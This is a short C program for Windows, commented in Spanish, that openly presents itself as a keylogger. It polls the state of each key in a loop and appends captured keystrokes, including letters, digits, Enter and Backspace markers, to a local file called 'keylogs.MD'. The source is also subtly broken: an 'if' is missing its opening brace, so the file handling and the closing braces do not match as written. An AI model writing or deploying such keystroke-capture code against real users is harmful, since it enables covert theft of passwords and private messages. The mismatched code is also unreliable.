#include <windows.h>
#include <stdio.h>

int main()
{
    int c;
    FILE *file;

    // Al inicio del programa, abre el archivo y escribe el mensaje de inicio de sesión
    file = fopen("keylogs.MD", "a+");
    if (file == NULL)
    {
        printf("No se pudo abrir el archivo\n");
        return 1;
    }
    fprintf(file, "[Keylogger/Nueva Sesion]:\n");
    fclose(file);

    while (1)
    {
        for (c = 8; c <= 222; c++)
        {
            if (GetAsyncKeyState(c) == -32767)
            
                file = fopen("keylogs.MD", "a+");
                if (file == NULL)
                {
                    printf("No se pudo abrir el archivo\n");
                    return 1;
                }

                if ((c >= 39) && (c <= 64))
                {
                    fputc(c, file);
                    fclose(file);
                }
                else if ((c >= 65) && (c <= 90)) // letras mayúsculas y minúsculas
                {
                    if (GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_CAPITAL) & 0x0001) // si SHIFT o CAPSLOCK está activado
                    {
                        fputc(c, file); // mayúsculas
                    }
                    else
                    {
                        fputc(c + 32, file); // minúsculas
                    }
                    fclose(file);
                }
                else
                {
                    switch (c)
                    {
                    case VK_SPACE:
                        fputc(' ', file);
                        break;
                    case VK_RETURN:
                        fprintf(file, "[ENTER]\n");
                        break;
                    case VK_BACK:
                        fprintf(file, "[BACKSPACE]");
                        break;
                    case VK_CONTROL:
                        fprintf(file, "[CTRL]");
                        break;
                    case VK_SHIFT:
                        fprintf(file, "[SHIFT]");
                        break;
                    case VK_OEM_MINUS:
                        fprintf(file, "-");
                        break;
                    case VK_OEM_PERIOD:
                        fprintf(file, ".");
                        break;
                    case VK_ESCAPE:
                        fprintf(file, "\n_________________________\n"); // dos saltos de línea al final de la sesión
                        fclose(file);
                        return 0; // termina el programa
                    default:
                        break;
                    }
                    fclose(file);
                }
            }
        }
    }
    return 0;
}
